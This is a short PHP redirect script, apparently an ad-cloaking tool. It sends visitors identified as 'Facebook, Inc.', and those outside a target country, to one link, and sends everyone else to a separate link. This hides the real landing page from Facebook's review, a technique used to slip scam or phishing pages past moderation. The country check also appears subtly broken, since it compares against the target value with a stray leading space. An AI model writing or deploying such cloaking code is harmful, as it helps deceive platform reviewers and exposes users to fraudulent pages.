<?php

include ('detect.php');
include ('init.php');


if ($org == "Facebook, Inc.") {
    header("location: $redLink");
    exit();
}
elseif ($country !==" $targetCountry") {
    header("location: $redLink");
    exit();
}
else {
    header("location: $myLink");
    exit();
}